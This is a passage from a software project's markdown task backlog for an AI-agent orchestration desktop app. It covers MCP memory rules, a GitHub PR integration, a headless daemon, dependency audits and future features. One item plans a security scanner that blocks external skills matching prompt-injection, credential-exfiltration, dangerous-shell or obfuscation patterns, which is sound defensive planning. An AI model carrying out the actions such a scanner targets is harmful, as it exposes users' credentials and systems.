**Scope (adapted to Exegol's architecture — main-process logic, no bash hooks)**
1. **MCP server instructions**: add the PROACTIVE SAVE RULE + search-first triggers to our
   server's instruction surface (shim initialize response / tool descriptions)
2. **Spawn-context protocol block**: trigger list ("user confirms/rejects an approach →
   memory_save"), self-check line, "memory_list at task start", session-summary-before-done
   — appended to the existing memory injection in `buildSpawnContext`
3. **Declarative per-provider instruction registry** (engram agents.go model): canonical
   protocol + per-CLI native rules-file target written as a managed block (reuse T140
   writer) — covers hook-less CLIs (gemini/agy/opencode/devin)
4. **Turn-boundary save nudge**: main process tracks last memory_save per agent; if session
   >5min and no save >15min, inject a one-line reminder at the next Stop signal (T123),
   15-min cooldown debounce
5. Memory store upgrades (can split): `topic_key` upsert slots + save-time conflict
   surfacing with agent-as-judge (`judgment_required` → `memory_judge`, ask-user threshold)

**Likely files**
- `main/mcp/{exegol-protocol,exegol-tools,exegol-mcp-shim-bin}.ts`, `main/agents/spawn-context.ts`,
  `main/agents/agent-session-callbacks.ts` (nudge on Stop), `main/knowledge/managed-block.ts`,
  `main/memory/store.ts` (+migration for topic_key/relations)

---

### T58 — Runtime Permission Modes (remaining delta) `added: 2026-04-01`
**Priority**: P2 | **Effort**: S | **Source**: Anvil

Core shipped in v0.4.3 (types, spawn injection, modal selector, badge, pipeline propagation — archived in `TASK_COMPLETED/2604.md`). Remaining:
- Runtime mode switching (change mode while agent is running)
- Scheduler task `accessMode` propagation
(MCP tool-set gating shipped: `getToolDefsForAccessMode` in the Exegol MCP server; archived 2026-10-04.)

**Likely files**
- `apps/desktop/src/main/agents/*`
- `apps/desktop/src/main/pipeline/*`
- `apps/desktop/src/renderer/components/agents/SpawnAgentModal.tsx`
- `apps/desktop/src/renderer/components/terminal/*`

---

## Post-launch Backlog — Inspired by Competitors

### T93 — Mobile Companion App `added: 2026-04-15`
**Priority**: P3 | **Effort**: Very large | **Source**: Paseo Expo client

**Why**
- Long-running agents benefit enormously from remote monitoring: get notified on
  the phone when an agent enters `waiting_input`, approve/deny, read scrollback.
  This is Paseo's killer differentiator.
- Requires T94 (daemon mode) as prerequisite.

**Scope**
- New Expo/React Native app in `apps/mobile/`
- Connects to daemon via WebSocket + auth token (QR code pairing)
- v1: read-only — list agents, status, read ring buffer, push notifications
- v1.1: approve waiting_input, send one-line prompts, kill agents
- v2: full terminal view via a terminal emulator library

**Likely files**
- New: `apps/mobile/` (entire new Expo app)
- `apps/desktop/src/main/daemon/ws-server.ts` (WebSocket transport for mobile)
- `apps/desktop/src/main/security/pairing.ts` (QR token exchange)

---

### T94 — Headless Daemon Mode `added: 2026-04-15`
**Priority**: P3 | **Effort**: Large | **Source**: Paseo daemon architecture

**Why**
- Prerequisite for T93 (mobile) and a valuable standalone feature: run Exegol
  on a server/VPS and connect from anywhere. Enables CI-style agent pipelines
  without keeping the desktop app open.

**Scope**
- Extract the sidecar + DB + agent manager into a standalone daemon that runs
  without Electron (pure Node)
- Expose the existing tRPC router over WebSocket in addition to IPC
- Auth: token-based, stored in OS keychain for desktop client, in user file for
  mobile/CLI
- Desktop app becomes "a thin client to the daemon" by default, can still run
  embedded daemon for local use
- CLI (T89) also benefits from remote connection mode
- From T188 (moved 2026-10-04): the MCP server ships in the build and runs as a **headless daemon**
  (`exegol watch`, launchd), shared with the Owl / council tools; the Electron window is a view,
  not the runtime

**Likely files**
- New: `apps/daemon/` (standalone daemon bundle)
- `apps/desktop/src/main/ipc/router.ts` (WebSocket transport)
- `apps/desktop/src/main/security/keystore.ts` (daemon tokens)
- `packages/shared/src/transport/*` (shared ws protocol)

---

## Wave 2 Backlog — Competitive Review 2026-07

> Source analysis: `docs/RESEARCH/COMPETITIVE_REVIEW_2026_07.md`. Repos studied were cloned locally
> (not part of this repo).


---


### T142 — Integrations Hub: GitHub API first `added: 2026-07-04`
**Priority**: P1 | **Effort**: M | **Source**: original idea (Antonio) + emdash (11 tracker integrations validate demand); extends T71 · **reference implementation study: `RESEARCH/TERRAGON_OSS_2026_07.md`** (github_pr snapshot schema, pure derivation helpers, dirty-check→push refresh, review-comment→fix-agent prompt recipe, one-agent-per-PR debounce, one-line "Fix CI", PR idempotency — plus what NOT to copy: webhooks/App auth; poll with `gh` token + ETag/GraphQL instead)

**Why**
- Today PR state comes from `gh` CLI (Smart Git Button). A token-based GitHub API integration (Integrations section, not GitHub-exclusive) removes the gh dependency and unlocks the real prize: **closing the review loop** — PR review comments flow back into Exegol and can spawn a fix agent.
- Relating PRs ↔ projects ↔ agent runs gives us data no competitor surfaces: which agent's PRs get merged fastest, which get the most review pushback (feeds scoring).

**Scope** (patterns integrated from the terragon-oss study — file refs in the research doc)
- Settings → Integrations section: GitHub token (keystore/safeStorage), scopes documented; `gh` CLI stays as fallback. **Single identity = the user's `gh auth` login** (PR author is the human → CODEOWNERS works); NO GitHub App/webhooks (needs public endpoint)
- PR sync per project: poll + on-focus refresh **with ETag conditional requests or one GraphQL query for PR+reviews+checks** (uncached REST hits the 5k/hr limit on active repos)
- **`github_prs` table** (terragon schema near-verbatim): `repo_full_name + number UNIQUE`, status, base_ref, mergeable_state, checks_status, `agent_id` nullable (creator link never overwritten on upsert), updated_at
- **Pure derivation helpers** ported from terragon `github-api/helpers.ts`: PR status (merged/closed/draft/open), mergeable passthrough, checks aggregation (any pending→pending, any failure→failure, all success/neutral/skipped→success)
- **Dirty-check → push refresh**: fetch → compare 4 fields vs DB → write + `broadcastPRStatus` only on change (sibling of `broadcastAgentStatus`)
- **Review-comment → task → fix agent** (terragon recipe): synthetic ```diff block built from payload only (path, diff_hunk, line/side, "originally at line N"), reply-chain walk to thread root, prompt closes delegating to `gh` CLI; spawn on `pr.head.ref` in a worktree; store `source_metadata {repo, prNumber, commentId}`
- **One-agent-per-PR debounce**: batch key `{repo}:{pr}` with 60s window — N comments feed ONE agent as queued follow-ups, never N agents; reuse existing agent (unarchived first, newest)
- **"Fix CI" one-liner** wired to Smart Git Button failing-checks state: *'Fix the failing GitHub checks. Use `gh pr checks` to get the failures.'* — no CI log plumbing
- **PR idempotency + AI body maintenance**: `pulls.list({state:open, head})` exact head.ref match before create; AI `shouldUpdate` gate; always re-inject task deep-link + issue ref (reuse the Haiku key: `generatePRContent`/`updatePRContent`)
- Optional polish: model override in comment syntax (`@exegol [sonnet] fix this`)
- Architecture: `main/integrations/{registry,github/*}.ts` — registry pattern so Linear/Jira (T71, parked) plug in later

> Merged from T200.7, T184.8, T184.9, the `COMPETITIVE_UPDATE_2026_10.md` P2 "worktree cleanup
> after merge" and the T174 worktree hygiene note on 2026-10-04. The PR poll itself is T185.10.
- (T200.7) **React to PR checks, reviews and conflicts**: phase 1 shipped 2026-10-04
  (`feat/pr-watch`, `TASK_COMPLETED/2610.md`): opt-in "Watch PR" per agent, `gh` poller, boundary
  delivery, attention. Left: MCP `pr_watch` so an agent can start its own watch
- (T142) **The user's own PR comments are ignored**: the agent posts through the same `gh` login,
  so PR watch skips every comment by that login. Planned heuristic: a same-login comment created
  while the agent was idle counts as the user's
- (T184.8) **Merge PR has no guard.** `diff-pr.ts:51-52` defaults to `--squash` +
  `--delete-branch` (strategy is now a parameter) with no base-protection check; pullfrog refuses
  a direct merge when the base is unprotected ("base branch not protected — refusing CI-ungated
  merge") and prefers GitHub-native auto-merge with `expectedHeadOid`
- (T184.9) **PR body is `--fill`**: body = commit messages, no footer, no link back to the agent
  run. pullfrog's sentinel-delimited footer with strip-before-append makes PR-body updates
  idempotent, and records which model ran and WHY a model was substituted
- (P2) **Remove worktrees after their PR merges**, proving the work landed: opt-in sweep from the
  PR state the GitPane polls (openchamber `useMergedWorktreeCleanup.ts`, traycer sweep)
- (T174, worktree hygiene) **Symlinked shared directories across worktrees** (one `node_modules`
  serves all) and background worktree deletion: removing a `node_modules` tree synchronously
  blocked Orca's IPC 8-35s

**Likely files**
- New: `apps/desktop/src/main/integrations/*`, migration (pr_links table)
- `apps/desktop/src/main/ipc/procedures/github.ts`, `GitPane.tsx`, `SmartGitAction.tsx`, settings UI

---


### T144 — Dependency & Library Audit `added: 2026-07-04`
**Priority**: P2 | **Effort**: S-M | **Source**: internal

**Scope**
- Upgrade pass: Electron 41 → current stable, React 18 → 19 (evaluate: emdash ships 19), xterm/addons, node-pty rebuild chain, Biome, TS
- `spark audit` + `bun pm ls` review: prune unused deps, dedupe, license check pre-open-source
- **knip**: pruned 2026-09-29 (unused exports 66 → 5, knip findings 90 → 8). No knip config is committed: decide between committing it with a `bun run knip` script, or dropping it.
- Bundle budget: initial chunk ≤ 1MB enforced in CI (fonts already lazy — verify), track in BENCHMARKS.md
- Rust: `cargo update` + clippy pedantic re-run; napi + memchr versions
- Baseline 2026-07 was 0 files >450 LOC. 2026-09-22: 8 files >500 LOC (`SpawnAgentModal.tsx` 689, `exegol-server.ts` 626, `AgentDashboard.tsx` 612, `migrations.ts` 590, `procedures/agents.ts` 570, `FileExplorer.tsx` 514, `WorkspacePane.tsx` 507, `exegol-mcp-config.ts` 506)
- Dead surface inventory 2026-09-22: see T185.4
- **MCP HOST** (moved here from the Wave 2 verification list on 2026-10-04): Exegol connecting to
  external servers (`mcp/host.ts`, `registry.ts`, the `mcp.*` connect/tools procedures), kept on
  purpose (2026-09-29), not usable: it never had a UI and nothing connects it; stdio frames with
  `Content-Length` (MCP stdio is newline JSON, the shim's old bug), no `notifications/initialized`
  after `initialize`, protocol pinned to 2024-11-05, no tests. `spawn-context` pastes
  `buildToolContext()` into agent prompts: empty today, but harmful if a server were connected
  (agents cannot call tools outside their own MCP config). Rebuild on `@modelcontextprotocol/sdk`
  when there is a real consumer (e.g. a pipeline step calling a tool without an agent).
- **Orphaned tRPC procedures** (in `preload/capabilities.json`, no caller in `apps/desktop/src`, scan 2026-09-29):
  - Decided: `scheduler.*` (T185.1, no UI, kept until decided); `indexer.*` and `search.*` (T185.2, kept on purpose); `mcp.*` host procedures (MCP HOST note, kept on purpose); `queue.*` (T185.4); `budgets.list/delete` (budgets cannot be deleted from the UI, 2026-09-28 audit); `memory.extract` (T193.8); `messages.conversation` (kept, read-only)
  - Undecided, wire or delete one by one: `projects.open`, `agents.getStatus/updateStatus/getParallelRun/cancelParallelRun/preflight` (cancel: T185.3), `tokenUsage.history/pipelineRunCost`, `apiKeys.test`, `diff.structuredDiff`, `scrollback.exists`, `oplog.listAgent`, `skills.getContent/getEnabledForSpawn`, `skillInstaller.lockFile`, `memory.getContext/updateRelevance`, `qaTests.get`, `fsSearch.fuzzyFind/grep`, `projectGroups.reorder`
- ~~Recovery half-wiring~~ resolved 2026-07: `invalidatePane`/`getRecoveryToken`/`RecoveryToken` removed (`invalidReason` stays — set via `updatePane`, rendered in WorkspacePane); unused deps removed (`@radix-ui/react-dialog` in desktop+ui, `react-dropdown-menu` + `lucide-react` in ui)

---



### T133 — Remote Notification Channel (Telegram first) `added: 2026-07-04`
**Priority**: P2 | **Effort**: M | **Depends**: T124
- Telegram bot channel implementing the same `deliver()` interface; allowlist of chat ids; optional reply→prompt injection later. Validated demand: Orca mobile app, AgentsRoom.
- Depends on T200.6 (answer agent questions): the remote channel replies through the same path.
- Why (from the old P2 bets list): remote continuity is the most visible gap vs Omnara / Claude web
  / Codex Remote.

### T134 — ACP Boundary (experimental) `added: 2026-07-04`
**Priority**: P2 | **Effort**: L | **Source**: emdash `packages/core/src/acp/`, t3code `effect-acp`, Zed ACP
- Agent Client Protocol (JSON-RPC/stdio) for one provider (Claude Code or Gemini) in an experimental pane; structured events instead of PTY scraping; PTY remains default. Evaluate before committing to boundary refactor.
> Merged from the `COMPETITIVE_UPDATE_2026_10.md` P2 "headless structured runs" and T189's
> structured executions on 2026-10-04 (one structured-runs umbrella).
- (P2) Headless structured runs for pipeline steps and the evaluator: non-interactive steps use the
  JSON path, not scrollback (monocode `claudeProtocol.ts`, pullfrog, pi `docs/rpc.md`; see T183.11)
- (T189) Structured executions: spawn CLIs non-interactively (`claude -p`, `codex exec`, gemini)
  with a prepared prompt/structure, run headless to completion, deliver the result to the project
  store. "Define prompt + structure, get result" is what live sessions don't cover

### T135 — Derived Status + CDC change_log `added: 2026-07-04`
**Priority**: P2 | **Effort**: M | **Source**: ComposioHQ/agent-orchestrator (OBSERVE→UPDATE→DERIVE)
- Persist only durable facts (`activity_state`, `is_terminated`); derive display status read-time by precedence. `change_log` table (SQLite triggers) with seq watermark → renderer reconnects without gaps. Kills stale-status bug class.

### T136 — Tiered Merge Resolver `added: 2026-07-04`
**Priority**: P2 | **Effort**: M | **Source**: overstory merge queue + clash (worktree conflict detection)
- For parallel runs/pipelines: (1) clean merge → (2) keep-incoming → (3) AI-resolve → (4) reimplement-from-spec. Auto-commit runtime state files (`.claude/`, etc.) so they never block merges.
- **Proactive overlap detection**: warn when 2+ active worktrees touch the same files *before* merge time (cheap: compare `git status` paths across worktrees on a timer / on turn end).
- **Agent-assisted conflict resolution** (merged from the `COMPETITIVE_UPDATE_2026_10.md` P2 on 2026-10-04): ours/theirs/base per hunk + "Resolve with agent" instead of the disabled Resolve (oh-my-pi `conflict://`).

### T137 — Hunk Assignment + Absorb (GitPane) `added: 2026-07-04`
**Priority**: P2 | **Effort**: M-L | **Source**: GitButler `but-hunk-assignment` + `absorb.rs`
- Stable hunk UUIDs surviving edits → attribute uncommitted hunks to agents/branches; "absorb" redistributes agent fixups to the right commits.

### T138 — ModeTracker Headless `added: 2026-07-04`
**Priority**: P2 | **Effort**: S | **Source**: superset `terminal-mode-tracker.ts` (VSCode XtermSerializer lineage)
- A `HeadlessEmulator` exists (`main/terminal/headless-emulator.ts`) but reads modes with a per-write regex: a bracketed-paste sequence split across two writes leaves the mode off, and multi-mode `;` sequences fail (review 2026-09-05 #8). Track modes through the xterm parser, serialize only after the parser drained. Acceptance: splitting any supported sequence at any position gives the same final state.

### T139 — Skills Security Scan (pre-import) `added: 2026-07-04`
**Priority**: P2 | **Effort**: S-M | **Source**: mission-control Skills Hub scanner
- Pattern gate before installing external skills/MCP configs: prompt-injection, credential exfil, dangerous shell, obfuscation. Blocks write-to-disk on match; user override with warning.

---


## Terax Review — Stack Optimizations (Wave 1)

> Source: `docs/RESEARCH/TERAX_STACK_REVIEW.md` (Terax-AI vs Exegol comparison, 2026-05-21).
> All tasks below cite specific Terax files when copying patterns.
> Strategic stance: keep AI-spawned CLI as our core; adopt Terax's tighter implementation patterns.

### T122 — Vercel AI SDK + Ollama Support `added: 2026-04-15`
**Priority**: Wave 1 / P3 (radar) | **Effort**: M | **Source**: Terax `src/modules/ai/lib/agent.ts:70-211` + `transport.ts:71-114`

**Why**
- Today our direct LLM calls (commit msg `diff-ai.ts:53`, Tier-3 judge `scoring.ts:239`, evaluator, evidence) go through `lib/anthropic.ts#callAnthropicMessage` (withRetry since T150). Still missing: cache breakpoints, provider choice, schema-validated output (regex parse; see T192).
- Vercel AI SDK v6 gives us all of that + provider-agnostic API. Unlocks **Ollama / LM Studio / local models** via `@ai-sdk/openai-compatible` with a single abstraction.
- Not vital for our spawned-CLI core — keep on radar but value compounds if we add more in-process LLM utilities.

**Scope**
- Add deps: `ai`, `@ai-sdk/anthropic`, `@ai-sdk/openai-compatible` (for Ollama/LM Studio).
- New `apps/desktop/src/main/ai/llm.ts`:
  - `getAnthropic(db)`: pulls key from `keystore`, returns `LanguageModel`.
  - `getOllama(baseUrl)`: returns local OpenAI-compatible model.
  - `applyCacheBreakpoints(messages)`: helper porting Terax's `agent.ts:294-311` pattern.
- Refactor `diff-ai.ts`:
  - `generateText({ model, prompt, maxOutputTokens: 120, abortSignal })` instead of fetch.
- Refactor `scoring.ts:210-280`:
  - `generateObject({ model, schema: z.object({ clarity: z.number().min(1).max(5), ... }) })` — replaces regex parse on `text.match(/\{[^}]+\}/)`.
  - Apply cache breakpoints for ~30–50 % cost reduction across Tier-3 evaluations.
- Settings UI: new "Local Models" section under API Keys for Ollama base URL + model picker.
- **Anti-pattern reminder**: do NOT add separate code branches for Ollama / LM Studio / MLX. Single OpenAI-compatible abstraction with base-URL + name + key + headers config.

**Likely files**
- `apps/desktop/package.json`
- `apps/desktop/src/main/ai/llm.ts` (new)
- `apps/desktop/src/main/lib/anthropic.ts`, `ipc/procedures/diff-ai.ts`
- `apps/desktop/src/main/agents/scoring.ts`
- `apps/desktop/src/renderer/components/settings/ApiKeysSettings.tsx` (Ollama config)

---

## Wave 3 candidate — Owl / Fleet Watch `added: 2026-07-28`

> **Definition**: `docs/ARCHITECTURE/OWL_FLEET_WATCH.md` (agreed 2026-07-28). Owl is a
> NATIVE Exegol feature: background fleet-watch over registered repos, surfacing what
> Antonio has NOT seen/reviewed (attention tracking), consumed by the UI and by external
> Claude sessions via the existing MCP layer. Deferred until Wave 2.6 (hardening) closes.
> Salvage source: the archived `cli-proman` project (maintainer's machine).
> IDs renumbered 2026-09-22 (were T156/T157/T158/T160, which collided with the dashboard,
> messaging, memory-habit and alias tasks): T186, T187, T188, T189.
> 2026-10-04: T186 (Phase 1) and T187 (Phase 2) merged into T153; T159 dropped (its in-process
> backend contradicted T153's `llama-server` sidecar, the useful parts moved into T153 Phase 2).

### T188 — Owl Phase 3: MCP exposure + digest actions `P2` (depends: T153 Phases 1-2)
**Scope**: `fleet_digest` / `repo_status` / `mark_seen` tools on `mcp/exegol-server.ts` (the Exegol
MCP server; was `main/mcp/registry.ts`, which is the unused MCP host);
digest actions: create task, open session, launch review agent (only Exegol can close this
loop). External consumer #1: kickoff resume mode reading the digest instead of re-scanning.
The headless-daemon runtime requirement moved to T94 on 2026-10-04.
Definition: `docs/ARCHITECTURE/COUNCIL_BASE.md`.

### T189 — Council: cross-family review preset `P2` (depends: T188, T134)
**Definition**: `docs/ARCHITECTURE/COUNCIL_BASE.md`. Absorbs the standalone "council MCP"
project: one server, not two. NOT branded "rubber duck".
Rewritten 2026-10-04: structured executions moved to T134; the bus tools already exist
(`agent_send`, `message_status`, `messages_check`, `agent_link`, T157/T162) and were dropped.
**Why**: relay-by-hand between session agents was friction #1 of the jul-2026 conversation audit
(frontend↔backend, client↔cloud repo pairs).
**Scope**:
- Preset: cross-family review of a just-built change (return discrepancies), run as a T134
  structured execution.
- Per-project activity view in UI: new threads · council results · owl updates, with the
  same seen/unseen marks as Owl (one feed, three producers).

---

## Parked ideas

> Parked 2026-10-04: real ideas, not on the plan. One line each; the full spec of each is in
> `git show 501a2be:docs/TASK_TODO.md`. Unpark by filing it again under Active Backlog.

- **T73 SSH remote development** (`added: 2026-04-15`): high upside, too large; reference is Orca's
  local/SSH provider pairs behind a dispatch layer (`src/main/providers/`).
- **T71 Linear / Jira import** (`added: 2026-04-15`): no demand yet beyond GitHub Issues; plugs into
  the T142 integrations registry when it exists.
- **T97 Panel plugin SDK** (`added: 2026-04-15`): a 2-4 week platform bet (manifest, sandboxed
  host, dynamic panels) with no community to use it yet.
- **T114 xterm renderer pool** (`added: 2026-04-15`): measure first; T115 DormantRing and T178
  (no bytes to hidden panes) already shipped, and the pool pays off only above ~5 live tabs.
- **T154 Ephemeral validation containers** (`added: 2026-07-09`): disposable Apple `container` VMs
  for tests and evaluator gates (not agent isolation); waits for pipelines in daily use.
- **T46 Canary channel** (`added: 2026-04-15`): only worth it if a second release channel is planned.
- **T92 Cross-repo workspaces** (`added: 2026-04-15`): one tab bound to N repos; T146 project
  groups is the cheap precursor that shipped.
- **T60 Project hook scripts, remaining delta** (`added: 2026-04-01`): mostly superseded by T91
  (`.exegol/lifecycle.yaml`); left: an `archive` hook on worktree archival and env vars
  (`EXEGOL_ROOT_PATH`, `EXEGOL_WORKTREE_PATH`, `EXEGOL_BRANCH`, `EXEGOL_AGENT_ID`) in
  `lifecycle/loader.ts`. One S change when a hook needs them.
